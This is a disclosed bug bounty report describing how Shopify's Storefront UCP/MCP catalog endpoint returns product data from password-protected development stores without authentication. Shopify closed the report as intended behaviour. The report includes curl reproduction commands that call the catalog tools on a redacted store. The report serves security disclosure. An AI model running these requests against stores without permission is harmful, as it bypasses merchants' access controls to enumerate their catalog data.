## Program Summary

> An unauthenticated caller can use the Storefront UCP/MCP catalog tools to read product catalog data from a password-protected development store. The data returned is the store's product catalog, such as titles, prices, variants, and media.

We closed the report as Informative because development stores skip the storefront password for these endpoints by design. Our policy now lists this as a known issue: [Storefront MCP and UCP on dev stores](https://bugbounty.shopify.com/criteria#storefront-mcp-and-ucp-on-dev-stores). The community.shopify.dev answer the report cites is from May 2026 and no longer applies to dev stores.

## Vulnerability Details

## Summary:

The `POST /api/ucp/mcp` endpoint does not enforce the storefront's password-protection gate.

When the Online Store is password-protected, normal storefront product pages redirect unauthenticated visitors to `/password`. However, an unauthenticated caller can still invoke UCP/MCP catalogue tools without providing the storefront password, session cookie, or API token.

The issue affects at least `search_catalog`, `lookup_catalog`, and `get_product`.

## Steps To Reproduce:

1. Enable storefront password protection

Enable **Online Store > Preferences > Password protection**.

Verify that a normal product page is protected:

```bash
curl -i '████████/'
```

**Response**:
```
HTTP/2 302
date: Sat, 26 Sep 2026 17:33:56 GMT
content-type: text/html; charset=utf-8
content-length: 0
location: ████████/password
[...]
```

The product page redirects the unauthenticated request to `/password`.

2. Enumerate the catalogue using `search_catalog`

```bash
curl -i -X POST \
  '████████/api/ucp/mcp' \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json, text/event-stream' \
  --data '{
    "jsonrpc":"2.0",
    "id":1,
    "method":"tools/call",
    "params":{
      "name":"search_catalog",
      "arguments":{
        "meta":{
          "ucp-agent":{
            "profile":"https://shopify.dev/ucp/agent-profiles/2026-08-25/valid-with-capabilities.json"
          }
        },
        "catalog":{
          "context":{
            "address_country":"US",
            "currency":"USD"
          }
        }
      }
    }
  }'
```

This returns a list of products from the password-protected storefront, including product IDs, titles, handles, prices, variants, media and other catalogue metadata. The response also indicates that additional products can be retrieved through pagination.

A search `query` can additionally be supplied to selectively filter the catalogue by keyword.

3. Retrieve a specific product using `get_product`

```bash
curl -sS -X POST \
  '████████/api/ucp/mcp' \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json, text/event-stream' \
  --data '{
    "jsonrpc":"2.0",
    "id":1,
    "method":"tools/call",
    "params":{
      "name":"get_product",
      "arguments":{
        "meta":{
          "ucp-agent":{
            "profile":"https://shopify.dev/ucp/agent-profiles/2026-08-25/valid-with-capabilities.json"
          }
        },
        "catalog":{
          "id":"gid://shopify/Product/████████"
        }
      }
    }
  }'
```

This returns the complete UCP product object for the specified product, including its description, price, variants, availability, media, options and collections, etc.

4. Retrieve a product through `lookup_catalog`

```bash
curl -s -X POST \
  '████████/api/ucp/mcp' \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json, text/event-stream' \
  --data '{
    "jsonrpc":"2.0",
    "id":1,
    "method":"tools/call",
    "params":{
      "name":"lookup_catalog",
      "arguments":{
        "meta":{
          "ucp-agent":{
            "profile":"https://shopify.dev/ucp/agent-profiles/2026-08-25/valid-with-capabilities.json"
          }
        },
        "catalog":{
          "ids":["gid://shopify/Product/████████"]
        }
      }
    }
  }'
```

This also returns catalogue data for the specified product without requiring the storefront password or any authentication.
All requests above are made without storefront cookies, password credentials, or API tokens.

## Expected Behavior

When storefront password protection is enabled, unauthenticated UCP/MCP catalogue requests should be subject to the same access-control boundary, or require explicit merchant authorization/opt-in.

## Actual Behavior

The normal storefront is protected by the password gate, but `/api/ucp/mcp` continues to process unauthenticated catalogue requests and disclose product data.

Shopify's documentation identifies `/api/ucp/mcp` as the Storefront Catalog MCP endpoint. More importantly, a Shopify staff member has explicitly confirmed that when Online Store password protection is enabled, `/api/ucp/mcp` is protected by the same storefront password gate and requests are expected to redirect to `/password`.

## Suggested Fix

Enforce the storefront password-protection check before executing UCP/MCP catalogue tools.

If UCP/MCP access is intended to remain available while the storefront is password-protected, require explicit merchant opt-in rather than implicitly bypassing the storefront access-control boundary.

## Impact

An unauthenticated attacker can enumerate and retrieve catalogue information from a password-protected storefront, including:

* Product IDs, titles and handles
* Product descriptions
* Prices and list prices
* Variant IDs, prices and availability
* Product media/CDN URLs
* Options, tags and collections
* Other catalogue metadata returned by UCP/MCP

The `search_catalog` tool also supports pagination, allowing an attacker to continue enumerating the catalogue. It accepts search queries as well, allowing selective enumeration by keyword, including specific brands or competitor-related product names.
